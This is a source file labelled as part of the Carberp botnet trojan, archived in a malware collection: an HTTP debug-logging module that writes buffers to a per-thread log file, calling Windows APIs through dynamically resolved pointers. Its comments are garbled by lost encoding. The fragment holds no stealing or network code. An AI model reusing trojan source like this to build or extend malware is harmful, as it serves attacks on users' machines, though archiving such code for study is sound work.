/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------


#pragma hdrstop

#include "BotHTTPDebug.h"

#include "GetApi.h"
#include "Utils.h"

//---------------------------------------------------------------------------


DWORD   HTTPDebugPID = 0;
HANDLE  HTTPDebugHandle = NULL;
DWORD   HTTPDebugThread = 0;

//---------------------------------------------------------------------------

HANDLE HTTPDebug::Initialize(PCHAR FileName)
{
	// ������� �������������� ���� ��� ������ HTTP������
	if (IsNewProcess(HTTPDebugPID))
	{
		HTTPDebugHandle = NULL;
		HTTPDebugThread = 0;
	}

	if (HTTPDebugHandle != NULL)
    	return NULL;

	HTTPDebugHandle = pCreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0,
								CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (HTTPDebugHandle == INVALID_HANDLE_VALUE)
		HTTPDebugHandle = NULL;

	HTTPDebugThread = (DWORD)GetCurrentThreadId();

	return HTTPDebugHandle;
}
//---------------------------------------------------------------------------

void HTTPDebug::Close()
{
	// Close - ������� �������
	if (Active())
	{
		pCloseHandle(HTTPDebugHandle);
		HTTPDebugHandle = NULL;
		HTTPDebugThread = 0;
    }
}
//---------------------------------------------------------------------------

bool HTTPDebug::Active()
{
	//	������� ������ ������ ���� ������� �������
	//	���������������� ������
	DWORD ThreadID = (DWORD)GetCurrentThreadId();
	if (IsNewProcess(HTTPDebugPID))
	{
		HTTPDebugHandle = NULL;
		HTTPDebugThread = 0;
	}

	return HTTPDebugHandle != NULL && ThreadID == HTTPDebugThread;
}
//---------------------------------------------------------------------------

DWORD HTTPDebug::Write(LPVOID Buf, DWORD BufSize)
{
	//  ������� ���������� ������ � �������� ����
	if (!Active() || Buf == NULL || BufSize == 0)
		return 0;

	DWORD Writed = 0;
	pWriteFile(HTTPDebugHandle, Buf, BufSize, &Writed, NULL);

	return Writed;
}
